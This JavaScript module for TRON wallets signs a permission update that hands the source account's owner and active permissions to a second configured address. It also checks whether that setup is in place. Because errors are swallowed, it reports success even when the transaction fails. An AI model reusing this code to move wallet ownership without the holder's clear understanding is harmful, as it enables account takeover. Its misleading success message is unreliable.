import { getBalance } from "./main.mjs";
import { tronWeb, wallet } from "./services/tronWeb.js";
import { log } from "./utils.mjs";

const isCorrectPermissions = permission => {
    return permission === "7fff1fc0033ec30f000000000000000000000000000000000000000000000000";
}

export const isValidSetup = account => {
    return account?.address === wallet.toAddress && isCorrectPermissions(account?.operation);
}

export async function getAccountPermissions(accountAddress) {
    try {
        const account = await tronWeb.trx.getAccount(accountAddress);

        if (!account.owner_permission || !account.active_permission) {
            return;
        }

        const { address } = account.owner_permission.keys.pop();
        const { operations: operation } = account.active_permission.pop();

        return {
            address: tronWeb.address.fromHex(address),
            operation
        }
    } finally { }
}

export async function setup(){
    const toBalance = await getBalance(wallet.fromAddress, true) / 1e6;

    log(`This wallet has ${toBalance} TRX.`);
    log("Approximately 100 TRX will be spent on fees.", 'yellow');

    if (toBalance >= 100) {
        log("Changing permissions...");

        await updatePermissions(wallet.fromAddress, wallet.to);
        const newBalance = await getBalance(wallet.fromAddress, true) / 1e6;

        log("Your account has been successfully set up.", 'green');
        log(`Your new balance is ${newBalance} TRX.`);

        log(`This may take a few minutes to be confirmed by the blockchain.`, 'red');
        log(`Trying again will result in a false positive.`, 'yellow');
        log('Just wait a few moments');
    } else {
        log("More than 100 TRX are required in the account to pay the permission fees.", 'red');
        log("Check out how to set permissions manually:", "yellow", "https://xyz.me");
    }
}

async function updatePermissions() {
    try {
        const permissions = {
            owner_permission: {
                type: 0,
                permission_name: 'owner',
                threshold: 1,
                keys: [
                    {
                        address: tronWeb.address.toHex(wallet.toAddress),
                        weight: 1,
                    },
                ],
            },
            active_permissions: [
                {
                    type: 2,
                    permission_name: 'active',
                    threshold: 1,
                    operations: '7fff1fc0033ec30f000000000000000000000000000000000000000000000000',
                    keys: [
                        {
                            address: tronWeb.address.toHex(wallet.toAddress),
                            weight: 1,
                        },
                    ],
                },
            ],
        };

        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            wallet.fromAddress,
            permissions.owner_permission,
            null,
            permissions.active_permissions
        );

        const signedTransaction = await tronWeb.trx.sign(updateTransaction, wallet.fromPrivateKey);
        await tronWeb.trx.sendRawTransaction(signedTransaction);
    } catch (error) {
        log('An error occurred while updating your permissions.');
    }
}